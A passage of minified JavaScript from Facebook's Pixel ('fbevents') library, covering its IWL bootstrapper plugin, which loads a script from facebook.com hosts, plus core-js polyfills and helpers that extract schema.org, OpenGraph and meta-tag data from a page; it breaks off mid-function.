const keysToWatch = window.keysToWatch;
const globalVars = Object.keys(window); //global variable collection

/**
* Copyright (c) 2017-present, Facebook, Inc. All rights reserved.
*
* You are hereby granted a non-exclusive, worldwide, royalty-free license to use,
* copy, modify, and distribute this software in source code or binary form for use
* in connection with the web services and APIs provided by Facebook.
*
* As with any software that integrates with the Facebook platform, your use of
* this software is subject to the Facebook Platform Policy
* [http://developers.facebook.com/policy/]. This copyright notice shall be
* included in all copies or substantial portions of the software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
* FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
* COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
* IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
* CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/
(function (a, b, c, d) {
  var e = {
    exports: {}
  };
  e.exports;
  (function () {
    var f = a.fbq;
    f.execStart = a.performance && a.performance.now && a.performance.now();
    if (!function () {
      var b = a.postMessage || function () {};
      if (!f) {
        b({
          action: "FB_LOG",
          logType: "Facebook Pixel Error",
          logMessage: "Pixel code is not installed correctly on this page"
        }, "*");
        "error" in console && console.error("Facebook Pixel Error: Pixel code is not installed correctly on this page");
        return !1;
      }
      return !0;
    }()) return;
    f.__fbeventsModules || (f.__fbeventsModules = {}, f.__fbeventsResolvedModules = {}, f.getFbeventsModules = function (a) {
      f.__fbeventsResolvedModules[a] || (f.__fbeventsResolvedModules[a] = f.__fbeventsModules[a]());
      return f.__fbeventsResolvedModules[a];
    }, f.fbIsModuleLoaded = function (a) {
      return !!f.__fbeventsModules[a];
    }, f.ensureModuleRegistered = function (b, a) {
      f.fbIsModuleLoaded(b) || (f.__fbeventsModules[b] = a);
    });
    f.ensureModuleRegistered("signalsFBEventsGetIwlUrl", function () {
      return function (a, b, c, d) {
        var e = {
          exports: {}
        };
        e.exports;
        (function () {
          "use strict";

          var b = f.getFbeventsModules("signalsFBEventsGetTier"),
            c = d();
          function d() {
            try {
              if (a.trustedTypes && a.trustedTypes.createPolicy) {
                var b = a.trustedTypes;
                return b.createPolicy("facebook.com/signals/iwl", {
                  createScriptURL: function (a) {
                    var b = new URL(a);
                    b = b.hostname.endsWith(".facebook.com") && b.pathname == "/signals/iwl.js";
                    if (!b) throw new Error("Disallowed script URL");
                    return a;
                  }
                });
              }
            } catch (a) {}
            return null;
          }
          e.exports = function (a, d) {
            d = b(d);
            d = d == null ? "www.facebook.com" : "www." + d + ".facebook.com";
            d = "https://" + d + "/signals/iwl.js?pixel_id=" + a;
            if (c != null) return c.createScriptURL(d);else return d;
          };
        })();
        return e.exports;
      }(a, b, c, d);
    });
    f.ensureModuleRegistered("signalsFBEventsGetTier", function () {
      return function (f, b, c, d) {
        var e = {
          exports: {}
        };
        e.exports;
        (function () {
          "use strict";

          var a = /^https:\/\/www\.([A-Za-z0-9\.]+)\.facebook\.com\/tr\/?$/,
            b = ["https://www.facebook.com/tr", "https://www.facebook.com/tr/"];
          e.exports = function (c) {
            if (b.indexOf(c) !== -1) return null;
            var d = a.exec(c);
            if (d == null) throw new Error("Malformed tier: " + c);
            return d[1];
          };
        })();
        return e.exports;
      }(a, b, c, d);
    });
    f.ensureModuleRegistered("SignalsFBEvents.plugins.iwlbootstrapper", function () {
      return function (a, b, c, d) {
        var e = {
          exports: {}
        };
        e.exports;
        (function () {
          "use strict";

          var c = f.getFbeventsModules("SignalsFBEventsIWLBootStrapEvent"),
            d = f.getFbeventsModules("SignalsFBEventsLogging"),
            g = f.getFbeventsModules("SignalsFBEventsNetworkConfig"),
            h = f.getFbeventsModules("SignalsFBEventsPlugin"),
            i = f.getFbeventsModules("signalsFBEventsGetIwlUrl"),
            j = f.getFbeventsModules("signalsFBEventsGetTier"),
            k = d.logUserError,
            l = /^https:\/\/.*\.facebook\.com$/i,
            m = "FACEBOOK_IWL_CONFIG_STORAGE_KEY",
            n = a.sessionStorage ? a.sessionStorage : {
              getItem: function (a) {
                return null;
              },
              removeItem: function (a) {},
              setItem: function (a, b) {}
            };
          e.exports = new h(function (d, e) {
            function h(c, d) {
              var e = b.createElement("script");
              e.async = !0;
              e.onload = function () {
                if (!a.FacebookIWL || !a.FacebookIWL.init) return;
                var b = j(g.ENDPOINT);
                b != null && a.FacebookIWL.set && a.FacebookIWL.set("tier", b);
                d();
              };
              a.FacebookIWLSessionEnd = function () {
                n.removeItem(m), a.close();
              };
              e.src = i(c, g.ENDPOINT);
              b.body && b.body.appendChild(e);
            }
            var o = !1,
              p = function (a) {
                return !!(e && e.pixelsByID && Object.prototype.hasOwnProperty.call(e.pixelsByID, a));
              };
            function q() {
              if (o) return;
              var b = n.getItem(m);
              if (!b) return;
              b = JSON.parse(b);
              var c = b.pixelID,
                d = b.graphToken,
                e = b.sessionStartTime;
              o = !0;
              h(c, function () {
                var b = p(c) ? c : null;
                a.FacebookIWL.init(b, d, e);
              });
            }
            function r(b) {
              if (o) return;
              h(b, function () {
                return a.FacebookIWL.showConfirmModal(b);
              });
            }
            function s(a, b, c) {
              n.setItem(m, JSON.stringify({
                graphToken: a,
                pixelID: b,
                sessionStartTime: c
              })), q();
            }
            c.listen(function (b) {
              var c = b.graphToken;
              b = b.pixelID;
              s(c, b);
              a.FacebookIWLSessionEnd = function () {
                return n.removeItem(m);
              };
            });
            function d(a) {
              var b = a.data,
                c = b.graphToken,
                d = b.msg_type,
                f = b.pixelID;
              b = b.sessionStartTime;
              if (e && e.pixelsByID && e.pixelsByID[f] && e.pixelsByID[f].codeless === "false") {
                k({
                  pixelID: f,
                  type: "SITE_CODELESS_OPT_OUT"
                });
                return;
              }
              if (n.getItem(m) || !l.test(a.origin) || !(a.data && (d === "FACEBOOK_IWL_BOOTSTRAP" || d === "FACEBOOK_IWL_CONFIRM_DOMAIN"))) return;
              switch (d) {
                case "FACEBOOK_IWL_BOOTSTRAP":
                  a.source.postMessage("FACEBOOK_IWL_BOOTSTRAP_ACK", a.origin);
                  s(c, f, b);
                  break;
                case "FACEBOOK_IWL_CONFIRM_DOMAIN":
                  a.source.postMessage("FACEBOOK_IWL_CONFIRM_DOMAIN_ACK", a.origin);
                  r(f);
                  break;
              }
            }
            if (n.getItem(m)) {
              q();
              return;
            }
            a.opener && a.addEventListener("message", d);
          });
        })();
        return e.exports;
      }(a, b, c, d);
    });
    e.exports = f.getFbeventsModules("SignalsFBEvents.plugins.iwlbootstrapper");
    f.registerPlugin && f.registerPlugin("fbevents.plugins.iwlbootstrapper", e.exports);
    f.ensureModuleRegistered("fbevents.plugins.iwlbootstrapper", function () {
      return e.exports;
    });
  })();
})(window, document, location, history);
(function (a, b, c, d) {
  var e = {
    exports: {}
  };
  e.exports;
  (function () {
    var f = a.fbq;
    f.execStart = a.performance && a.performance.now && a.performance.now();
    if (!function () {
      var b = a.postMessage || function () {};
      if (!f) {
        b({
          action: "FB_LOG",
          logType: "Facebook Pixel Error",
          logMessage: "Pixel code is not installed correctly on this page"
        }, "*");
        "error" in console && console.error("Facebook Pixel Error: Pixel code is not installed correctly on this page");
        return !1;
      }
      return !0;
    }()) return;
    var g = typeof Symbol === "function" && typeof (typeof Symbol === "function" ? Symbol.iterator : "@@iterator") === "symbol" ? function (a) {
      return typeof a;
    } : function (a) {
      return a && typeof Symbol === "function" && a.constructor === Symbol && a !== (typeof Symbol === "function" ? Symbol.prototype : "@@prototype") ? "symbol" : typeof a;
    };
    f.__fbeventsModules || (f.__fbeventsModules = {}, f.__fbeventsResolvedModules = {}, f.getFbeventsModules = function (a) {
      f.__fbeventsResolvedModules[a] || (f.__fbeventsResolvedModules[a] = f.__fbeventsModules[a]());
      return f.__fbeventsResolvedModules[a];
    }, f.fbIsModuleLoaded = function (a) {
      return !!f.__fbeventsModules[a];
    }, f.ensureModuleRegistered = function (b, a) {
      f.fbIsModuleLoaded(b) || (f.__fbeventsModules[b] = a);
    });
    f.ensureModuleRegistered("SignalsFBEventsShared", function () {
      return function (f, b, c, d) {
        var e = {
          exports: {}
        };
        e.exports;
        (function () {
          e.exports = function (a) {
            var b = {};
            function c(d) {
              if (b[d]) return b[d].exports;
              var e = b[d] = {
                i: d,
                l: !1,
                exports: {}
              };
              return a[d].call(e.exports, e, e.exports, c), e.l = !0, e.exports;
            }
            return c.m = a, c.c = b, c.d = function (a, b, d) {
              c.o(a, b) || Object.defineProperty(a, b, {
                enumerable: !0,
                get: d
              });
            }, c.r = function (a) {
              "undefined" != typeof Symbol && (typeof Symbol === "function" ? Symbol.toStringTag : "@@toStringTag") && Object.defineProperty(a, typeof Symbol === "function" ? Symbol.toStringTag : "@@toStringTag", {
                value: "Module"
              }), Object.defineProperty(a, "__esModule", {
                value: !0
              });
            }, c.t = function (a, b) {
              if (1 & b && (a = c(a)), 8 & b) return a;
              if (4 & b && "object" == (typeof a === "undefined" ? "undefined" : g(a)) && a && a.__esModule) return a;
              var d = Object.create(null);
              if (c.r(d), Object.defineProperty(d, "default", {
                enumerable: !0,
                value: a
              }), 2 & b && "string" != typeof a) for (b in a) c.d(d, b, function (b) {
                return a[b];
              }.bind(null, b));
              return d;
            }, c.n = function (a) {
              var b = a && a.__esModule ? function () {
                return a["default"];
              } : function () {
                return a;
              };
              return c.d(b, "a", b), b;
            }, c.o = function (a, b) {
              return Object.prototype.hasOwnProperty.call(a, b);
            }, c.p = "", c(c.s = 56);
          }([function (a, b, c) {
            a.exports = c(97);
          }, function (a, b, c) {
            "use strict";

            a.exports = function (a) {
              if (null != a) return a;
              throw new Error("Got unexpected null or undefined");
            };
          }, function (a, b, c) {
            a.exports = c(59);
          }, function (a, b, c) {
            a.exports = c(69);
          }, function (a, b, c) {
            var d = c(34)("wks"),
              e = c(47),
              f = c(6).Symbol,
              g = c(64);
            a.exports = function (a) {
              return d[a] || (d[a] = g && f[a] || (g ? f : e)("Symbol." + a));
            };
          }, function (a, b, c) {
            a.exports = c(99);
          }, function (a, b) {
            a.exports = "object" == (typeof f === "undefined" ? "undefined" : g(f)) && f && f.Math == Math ? f : "object" == (typeof self === "undefined" ? "undefined" : g(self)) && self && self.Math == Math ? self : Function("return this")();
          }, function (a, b, c) {
            "use strict";

            var d = c(6),
              e = c(65).f,
              f = c(67),
              h = c(38),
              i = c(31),
              j = c(13),
              k = c(14),
              l = function (a) {
                var b = function (d, b, c) {
                  if (this instanceof a) {
                    switch (arguments.length) {
                      case 0:
                        return new a();
                      case 1:
                        return new a(d);
                      case 2:
                        return new a(d, b);
                    }
                    return new a(d, b, c);
                  }
                  return a.apply(this, arguments);
                };
                return b.prototype = a.prototype, b;
              };
            a.exports = function (a, b) {
              var c,
                m,
                n,
                o,
                p,
                q = a.target,
                r = a.global,
                s = a.stat,
                t = a.proto,
                u = r ? d : s ? d[q] : (d[q] || {}).prototype,
                v = r ? h : h[q] || (h[q] = {}),
                w = v.prototype;
              for (m in b) c = !f(r ? m : q + (s ? "." : "#") + m, a.forced) && u && k(u, m), n = v[m], c && (o = a.noTargetGet ? (p = e(u, m)) && p.value : u[m]), p = c && o ? o : b[m], c && (typeof n === "undefined" ? "undefined" : g(n)) == (typeof p === "undefined" ? "undefined" : g(p)) || (c = a.bind && c ? i(p, d) : a.wrap && c ? l(p) : t && "function" == typeof p ? i(Function.call, p) : p, (a.sham || p && p.sham || n && n.sham) && j(c, "sham", !0), v[m] = c, t && (k(h, n = q + "Prototype") || j(h, n, {}), h[n][m] = p, a.real && w && !w[m] && j(w, m, p)));
            };
          }, function (a, b, c) {
            "use strict";

            c.d(b, "a", function () {
              return e;
            }), c.d(b, "b", function () {
              return f;
            });
            var d = c(17),
              e = 500;
            function f(a) {
              var b = void 0;
              switch (a.tagName.toLowerCase()) {
                case "meta":
                  b = a.getAttribute("content");
                  break;
                case "audio":
                case "embed":
                case "iframe":
                case "img":
                case "source":
                case "track":
                case "video":
                  b = a.getAttribute("src");
                  break;
                case "a":
                case "area":
                case "link":
                  b = a.getAttribute("href");
                  break;
                case "object":
                  b = a.getAttribute("data");
                  break;
                case "data":
                case "meter":
                  b = a.getAttribute("value");
                  break;
                case "time":
                  b = a.getAttribute("datetime");
                  break;
                default:
                  b = Object(d.a)(a) || "";
              }
              return "string" == typeof b ? b.substr(0, e) : "";
            }
          }, function (a, b, c) {
            "use strict";

            var d = c(57);
            a.exports = function a(b, c) {
              return !(!b || !c) && (b === c || !d(b) && (d(c) ? a(b, c.parentNode) : "contains" in b ? b.contains(c) : !!b.compareDocumentPosition && !!(16 & b.compareDocumentPosition(c))));
            };
          }, function (a, b, c) {
            a.exports = c(95);
          }, function (a, b) {
            a.exports = function (a) {
              try {
                return !!a();
              } catch (a) {
                return !0;
              }
            };
          }, function (a, b) {
            a.exports = function (a) {
              return "object" == (typeof a === "undefined" ? "undefined" : g(a)) ? null !== a : "function" == typeof a;
            };
          }, function (a, b, c) {
            var d = c(25),
              e = c(26);
            a.exports = c(19) ? function (a, b, c) {
              return d.f(a, b, e(1, c));
            } : function (a, b, c) {
              return a[b] = c, a;
            };
          }, function (a, b) {
            var c = {}.hasOwnProperty;
            a.exports = function (a, b) {
              return c.call(a, b);
            };
          }, function (a, b, c) {
            a.exports = c(68);
          }, function (a, b, c) {
            a.exports = c(102);
          }, function (a, b, c) {
            "use strict";

            function d(a) {
              if (null == a) return null;
              if (null != a.innerText && 0 !== a.innerText.length) return a.innerText;
              var b = a.text;
              return null != b && "string" == typeof b && 0 !== b.length ? b : null != a.textContent && a.textContent.length > 0 ? a.textContent : null;
            }
            c.d(b, "a", function () {
              return d;
            });
          }, function (a, b, c) {
            var d = c(33),
              e = Math.min;
            a.exports = function (a) {
              return a > 0 ? e(d(a), 9007199254740991) : 0;
            };
          }, function (a, b, c) {
            a.exports = !c(11)(function () {
              return 7 != Object.defineProperty({}, "a", {
                get: function () {
                  return 7;
                }
              }).a;
            });
          }, function (a, b, c) {
            var d = c(12);
            a.exports = function (a) {
              if (!d(a)) throw TypeError(String(a) + " is not an object");
              return a;
            };
          }, function (a, b, c) {
            a.exports = c(106);
          }, function (a, b) {
            var c = {}.toString;
            a.exports = function (a) {
              return c.call(a).slice(8, -1);
            };
          }, function (a, b, c) {
            var d = c(24);
            a.exports = function (a) {
              return Object(d(a));
            };
          }, function (a, b) {
            a.exports = function (a) {
              if (null == a) throw TypeError("Can't call method on " + a);
              return a;
            };
          }, function (a, b, c) {
            a = c(19);
            var d = c(45),
              e = c(20),
              f = c(35),
              g = Object.defineProperty;
            b.f = a ? g : function (a, b, c) {
              if (e(a), b = f(b, !0), e(c), d) try {
                return g(a, b, c);
              } catch (a) {}
              if ("get" in c || "set" in c) throw TypeError("Accessors not supported");
              return "value" in c && (a[b] = c.value), a;
            };
          }, function (a, b) {
            a.exports = function (a, b) {
              return {
                enumerable: !(1 & a),
                configurable: !(2 & a),
                writable: !(4 & a),
                value: b
              };
            };
          }, function (a, b) {
            a.exports = {};
          }, function (a, b, c) {
            "use strict";

            c.d(b, "a", function () {
              return d;
            });
            var d = ["Order", "AggregateOffer", "CreativeWork", "Event", "MenuItem", "Product", "Service", "Trip", "ActionAccessSpecification", "ConsumeAction", "MediaSubscription", "Organization", "Person"];
          }, function (a, b, c) {
            "use strict";

            a.exports = function (a) {
              var b = [];
              return function a(b, c) {
                for (var d = b.length, e = 0; d--;) {
                  var f = b[e++];
                  Array.isArray(f) ? a(f, c) : c.push(f);
                }
              }(a, b), b;
            };
          }, function (a, b, c) {
            var d = c(31),
              e = c(32),
              f = c(23),
              g = c(18),
              h = c(61);
            a.exports = function (a, b) {
              var c = 1 == a,
                i = 2 == a,
                j = 3 == a,
                k = 4 == a,
                l = 6 == a,
                m = 5 == a || l,
                n = b || h;
              return function (b, h, o) {
                for (var p, q, r = f(b), s = e(r), h = d(h, o, 3), o = g(s.length), t = 0, b = c ? n(b, o) : i ? n(b, 0) : void 0; o > t; t++) if ((m || t in s) && (q = h(p = s[t], t, r), a)) if (c) b[t] = q;else if (q) switch (a) {
                  case 3:
                    return !0;
                  case 5:
                    return p;
                  case 6:
                    return t;
                  case 2:
                    b.push(p);
                } else if (k) return !1;
                return l ? -1 : j || k ? k : b;
              };
            };
          }, function (a, b, c) {
            var d = c(44);
            a.exports = function (a, b, c) {
              if (d(a), void 0 === b) return a;
              switch (c) {
                case 0:
                  return function () {
                    return a.call(b);
                  };
                case 1:
                  return function (c) {
                    return a.call(b, c);
                  };
                case 2:
                  return function (c, d) {
                    return a.call(b, c, d);
                  };
                case 3:
                  return function (c, d, e) {
                    return a.call(b, c, d, e);
                  };
              }
              return function () {
                return a.apply(b, arguments);
              };
            };
          }, function (a, b, c) {
            b = c(11);
            var d = c(22),
              e = "".split;
            a.exports = b(function () {
              return !Object("z").propertyIsEnumerable(0);
            }) ? function (a) {
              return "String" == d(a) ? e.call(a, "") : Object(a);
            } : Object;
          }, function (a, b) {
            var c = Math.ceil,
              d = Math.floor;
            a.exports = function (a) {
              return isNaN(a = +a) ? 0 : (a > 0 ? d : c)(a);
            };
          }, function (a, b, c) {
            b = c(6);
            var d = c(63),
              e = b["__core-js_shared__"] || d("__core-js_shared__", {});
            (a.exports = function (a, b) {
              return e[a] || (e[a] = void 0 !== b ? b : {});
            })("versions", []).push({
              version: "3.0.0",
              mode: c(36) ? "pure" : "global",
              copyright: "\xa9 2019 Denis Pushkarev (zloirock.ru)"
            });
          }, function (a, b, c) {
            var d = c(12);
            a.exports = function (a, b) {
              if (!d(a)) return a;
              var c, e;
              if (b && "function" == typeof (c = a.toString) && !d(e = c.call(a))) return e;
              if ("function" == typeof (c = a.valueOf) && !d(e = c.call(a))) return e;
              if (!b && "function" == typeof (c = a.toString) && !d(e = c.call(a))) return e;
              throw TypeError("Can't convert object to primitive value");
            };
          }, function (a, b) {
            a.exports = !0;
          }, function (a, b, c) {
            var d = c(32),
              e = c(24);
            a.exports = function (a) {
              return d(e(a));
            };
          }, function (a, b) {
            a.exports = {};
          }, function (a, b, c) {
            var d = c(34)("keys"),
              e = c(47);
            a.exports = function (a) {
              return d[a] || (d[a] = e(a));
            };
          }, function (a, b) {
            a.exports = {};
          }, function (a, b, c) {
            var d = c(37),
              e = c(18),
              f = c(82);
            a.exports = function (a) {
              return function (b, c, g) {
                var h;
                b = d(b);
                var i = e(b.length);
                g = f(g, i);
                if (a && c != c) {
                  for (; i > g;) if ((h = b[g++]) != h) return !0;
                } else for (; i > g; g++) if ((a || g in b) && b[g] === c) return a || g || 0;
                return !a && -1;
              };
            };
          }, function (a, c, d) {
            "use strict";

            d.r(c), d.d(c, "getSchemaDotOrgProductNodesAsJsonLD", function () {
              return o;
            }), d.d(c, "extractOpenGraph", function () {
              return p;
            }), d.d(c, "extractMeta", function () {
              return r;
            });
            var e = d(8),
              f = d(28);
            a = d(9);
            var g = d.n(a);
            c = d(1);
            var h = d.n(c);
            a = d(2);
            var i = d.n(a);
            c = d(3);
            var j = d.n(c);
            a = d(10);
            var k = d.n(a);
            c = d(0);
            var l = d.n(c);
            function m(a) {
              return function (a) {
                if (Array.isArray(a)) {
                  for (var b = 0, c = new Array(a.length); b < a.length; b++) c[b] = a[b];
                  return c;
                }
              }(a) || function (a) {
                if ((typeof Symbol === "function" ? Symbol.iterator : "@@iterator") in Object(a) || "[object Arguments]" === Object.prototype.toString.call(a)) return Array.from(a);
              }(a) || function () {
                throw new TypeError("Invalid attempt to spread non-iterable instance");
              }();
            }
            var n = ["og", "product", "music", "video", "article", "book", "profile", "website", "twitter"];
            function o(a) {
              for (var c = l()(f.a, function (a) {
                  return '[itemtype$="'.concat("schema.org/").concat(a, '"]');
                }).join(", "), d = [], c = j()(b.querySelectorAll(c)), s = []; c.length > 0;) {
                var t = c.pop();
                if (!k()(d, t)) {
                  var u = {
                    "@context": "http://schema.org"
                  };
                  s.push({
                    htmlElement: t,
                    jsonLD: u
                  });
                  for (t = [{
                    element: t,
                    workingNode: u
                  }]; t.length;) {
                    u = t.pop();
                    var n = u.element;
                    u = u.workingNode;
                    var p = h()(n.getAttribute("itemtype"));
                    u["@type"] = p.substr(p.indexOf("schema.org/") + "schema.org/".length);
                    for (p = j()(n.querySelectorAll("[itemprop]")).reverse(); p.length;) {
                      var q = p.pop();
                      if (!k()(d, q)) {
                        d.push(q);
                        var r = h()(q.getAttribute("itemprop"));
                        if (q.hasAttribute("itemscope")) {
                          var v = {};
                          u[r] = v, t.push({
                            element: n,
                            workingNode: u
                          }), t.push({
                            element: q,
                            workingNode: v
                          });
                          break;
                        }
                        u[r] = Object(e.b)(q);
                      }
                    }
                  }
                }
              }
              return i()(s, function (b) {
                return g()(b.htmlElement, a);
              });
            }
            function p() {
              return i()(l()(j()(b.querySelectorAll("meta[property]")), function (a) {
                var b = a.getAttribute("property");
                a = a.getAttribute("content");
                return "string" == typeof b && -1 !== b.indexOf(":") && "string" == typeof a && k()(n, b.split(":")[0]) ? {
                  key: b,
                  value: a.substr(0, e.a)
                } : null;
              }), Boolean);
            }
            var q = {
              description: !0,
              keywords: !0
            };
            function r() {
              var a = b.querySelector("title"),
                c = null;
              return null != a && null != a.innerText && (c = a.innerText.substr(0, e.a)), i()([null != c ? {
                key: "title",
                value: c
              } : null].concat(m(l()(j()(b.querySelectorAll("meta[name]")), function (a) {
                var b = a.getAttribute("name");
                a = a.getAttribute("content");
                return "string" == typeof b && "string" == typeof a && q[b] ? {
                  key: "meta:" + b,
                  value: a.substr(0, e.a)
                } : null;
              }))), Boolean);
            }
          }, function (a, b, c) {
            a.exports = c(104);
          }, function (a, b) {
            a.exports = function (a) {
              if ("function" != typeof a) throw TypeError(String(a) + " is not a function");
              return a;
            };
          }, function (a, b, c) {
            a.exports = !c(19) && !c(11)(function () {
              return 7 != Object.defineProperty(c(46)("div"), "a", {
                get: function () {
                  return 7;
                }
              }).a;
            });
          }, function (a, b, c) {
            b = c(12);
            var d = c(6).document,
              e = b(d) && b(d.createElement);
            a.exports = function (a) {
              return e ? d.createElement(a) : {};
            };
          }, function (a, b) {
            var c = 0,
              d = Math.random();
            a.exports = function (a) {
              return "Symbol(".concat(void 0 === a ? "" : a, ")_", (++c + d).toString(36));
            };
          }, function (a, b, c) {
            var d = c(11),
              e = c(4)("species");
            a.exports = function (a) {
              return !d(function () {
                var b = [];
                return (b.constructor = {})[e] = function () {
                  return {
                    foo: 1
                  };
                }, 1 !== b[a](Boolean).foo;
              });
            };
          }, function (a, b, c) {
            "use strict";

            var d, e;
            b = c(50);
            var f = c(13),
              g = c(14),
              h = c(36);
            c = c(4)("iterator");
            var i = !1;
            [].keys && ("next" in (e = [].keys()) ? (b = b(b(e))) !== Object.prototype && (d = b) : i = !0), null == d && (d = {}), h || g(d, c) || f(d, c, function () {
              return this;
            }), a.exports = {
              IteratorPrototype: d,
              BUGGY_SAFARI_ITERATORS: i
            };
          }, function (a, b, c) {
            var d = c(14),
              e = c(23),
              f = c(39)("IE_PROTO");
            b = c(77);
            var g = Object.prototype;
            a.exports = b ? Object.getPrototypeOf : function (a) {
              return a = e(a), d(a, f) ? a[f] : "function" == typeof a.constructor && a instanceof a.constructor ? a.constructor.prototype : a instanceof Object ? g : null;
            };
          }, function (a, b) {
            a.exports = ["constructor", "hasOwnProperty", "isPrototypeOf", "propertyIsEnumerable", "toLocaleString", "toString", "valueOf"];
          }, function (a, b, c) {
            var d = c(25).f,
              e = c(13),
              f = c(14),
              g = c(4)("toStringTag"),
              h = c(84),
              i = h !== {}.toString;
            a.exports = function (a, b, c, j) {
              if (a) {
                c = c ? a : a.prototype;
                f(c, g) || d(c, g, {
                  configurable: !0,
                  value: b
                }), j && i && e(c, "toString", h);
              }
            };
          }, function (a, b, c) {
            var d = c(22),
              e = c(4)("toStringTag"),
              f = "Arguments" == d(function () {
                return arguments;
              }());
            a.exports = function (a) {
              var b;
              return void 0 === a ? "Undefined" : null === a ? "Null" : "string" == typeof (b = function (a, b) {
                try {
                  return a[b];
                } catch (a) {}
              }(a = Object(a), e)) ? b : f ? d(a) : "Object" == (b = d(a)) && "function" == typeof a.callee ? "Arguments" : b;
            };
          }, function (a, b) {
            a.exports = function () {};
          }, function (a, b, c) {
            "use strict";

            var d = c(11);
            a.exports = function (a, b) {
              var c = [][a];
              return !c || !d(function () {
                c.call(null, b || function () {
                  throw Error();
                }, 1);
              });
            };
          }, function (a, b, c) {
            a.exports = c(111);
          }, function (a, b, c) {
            "use strict";

            var d = c(58);
            a.exports = function (a) {
              return d(a) && 3 == a.nodeType;
            };
          }, function (a, c, d) {
            "use strict";

            a.exports = function (a) {
              var c = (a ? a.ownerDocument || a : b).defaultView || f;
              return !(!a || !("function" == typeof c.Node ? a instanceof c.Node : "object" == (typeof a === "undefined" ? "undefined" : g(a)) && "number" == typeof a.nodeType && "string" == typeof a.nodeName));
            };
          }, function (a, b, c) {
            c(60), a.exports = c(15)("Array", "filter");
          }, function (a, b, c) {
            "use strict";

            var d = c(30)(2);
            a = c(48)("filter");
            c(7)({
              target: "Array",
              proto: !0,
              forced: !a
            }, {
              filter: function (a) {
                return d(this, a, arguments[1]);
              }
            });
          }, function (a, b, c) {
            var d = c(12),
              e = c(62),
              f = c(4)("species");
            a.exports = function (a, b) {
              var c;
              return e(a) && ("function" != typeof (c = a.constructor) || c !== Array && !e(c.prototype) ? d(c) && null === (c = c[f]) && (c = void 0) : c = void 0), new (void 0 === c ? Array : c)(0 === b ? 0 : b);
            };
          }, function (a, b, c) {
            var d = c(22);
            a.exports = Array.isArray || function (a) {
              return "Array" == d(a);
            };
          }, function (a, b, c) {
            var d = c(6),
              e = c(13);
            a.exports = function (a, b) {
              try {
                e(d, a, b);
              } catch (c) {
                d[a] = b;
              }
              return b;
            };
          }, function (a, b, c) {
            a.exports = !c(11)(function () {
              String(Symbol());
            });
          }, function (a, b, c) {
            a = c(19);
            var d = c(66),
              e = c(26),
              f = c(37),
              g = c(35),
              h = c(14),
              i = c(45),
              j = Object.getOwnPropertyDescriptor;
            b.f = a ? j : function (a, b) {
              if (a = f(a), b = g(b, !0), i) try {
                return j(a, b);
              } catch (a) {}
              if (h(a, b)) return e(!d.f.call(a, b), a[b]);
            };
          }, function (a, b, c) {
            "use strict";

            a = {}.propertyIsEnumerable;
            var d = Object.getOwnPropertyDescriptor;
            c = d && !a.call({
              1: 2
            }, 1);
            b.f = c ? function (a) {
              a = d(this, a);
              return !!a && a.enumerable;
            } : a;
          }, function (a, b, c) {
            var d = c(11),
              e = /#|\.prototype\./;
            b = function (a, b) {
              a = g[f(a)];
              return a == i || a != h && ("function" == typeof b ? d(b) : !!b);
            };
            var f = b.normalize = function (a) {
                return String(a).replace(e, ".").toLowerCase();
              },
              g = b.data = {},
              h = b.NATIVE = "N",
              i = b.POLYFILL = "P";
            a.exports = b;
          }, function (a, b, c) {
            var d = c(38),
              e = c(6),
              f = function (a) {
                return "function" == typeof a ? a : void 0;
              };
            a.exports = function (a, b) {
              return arguments.length < 2 ? f(d[a]) || f(e[a]) : d[a] && d[a][b] || e[a] && e[a][b];
            };
          }, function (a, b, c) {
            c(70), c(88), a.exports = c(38).Array.from;
          }, function (a, b, c) {
            "use strict";

            var d = c(71);
            a = c(72);
            b = c(75);
            var e = a.set,
              f = a.getterFor("String Iterator");
            b(String, "String", function (a) {
              e(this, {
                type: "String Iterator",
                string: String(a),
                index: 0
              });
            }, function () {
              var a = f(this),
                b = a.string,
                c = a.index;
              return c >= b.length ? {
                value: void 0,
                done: !0
              } : (b = d(b, c, !0), a.index += b.length, {
                value: b,
                done: !1
              });
            });
          }, function (a, b, c) {
            var d = c(33),
              e = c(24);
            a.exports = function (a, b, c) {
              var f, g;
              a = String(e(a));
              b = d(b);
              var h = a.length;
              return b < 0 || b >= h ? c ? "" : void 0 : (f = a.charCodeAt(b)) < 55296 || f > 56319 || b + 1 === h || (g = a.charCodeAt(b + 1)) < 56320 || g > 57343 ? c ? a.charAt(b) : f : c ? a.slice(b, b + 2) : g - 56320 + (f - 55296 << 10) + 65536;
            };
          }, function (a, b, c) {
            var d, e, f;
            b = c(73);
            var g = c(12),
              h = c(13),
              i = c(14),
              j = c(39),
              k = c(40);
            c = c(6).WeakMap;
            if (b) {
              var l = new c(),
                m = l.get,
                n = l.has,
                o = l.set;
              d = function (a, b) {
                return o.call(l, a, b), b;
              }, e = function (a) {
                return m.call(l, a) || {};
              }, f = function (a) {
                return n.call(l, a);
              };
            } else {
              var p = j("state");
              k[p] = !0, d = function (a, b) {
                return h(a, p, b), b;
              }, e = function (a) {
                return i(a, p) ? a[p] : {};
              }, f = function (a) {
                return i(a, p);
              };
            }
            a.exports = {
              set: d,
              get: e,
              has: f,
              enforce: function (a) {
                return f(a) ? e(a) : d(a, {});
              },
              getterFor: function (a) {
                return function (b) {
                  var c;
                  if (!g(b) || (c = e(b)).type !== a) throw TypeError("Incompatible receiver, " + a + " required");
                  return c;
                };
              }
            };
          }, function (a, b, c) {
            b = c(74);
            c = c(6).WeakMap;
            a.exports = "function" == typeof c && /native code/.test(b.call(c));
          }, function (a, b, c) {
            a.exports = c(34)("native-function-to-string", Function.toString);
          }, function (a, b, c) {
            "use strict";

            var d = c(7),
              e = c(76),
              f = c(50),
              g = c(85),
              h = c(52),
              i = c(13),
              j = c(87),
              k = c(36),
              l = c(4)("iterator"),
              m = c(27);
            b = c(49);
            var n = b.IteratorPrototype,
              o = b.BUGGY_SAFARI_ITERATORS,
              p = function () {
                return this;
              };
            a.exports = function (a, b, c, q, r, s, t) {
              e(c, b, q);
              var u;
              q = function (a) {
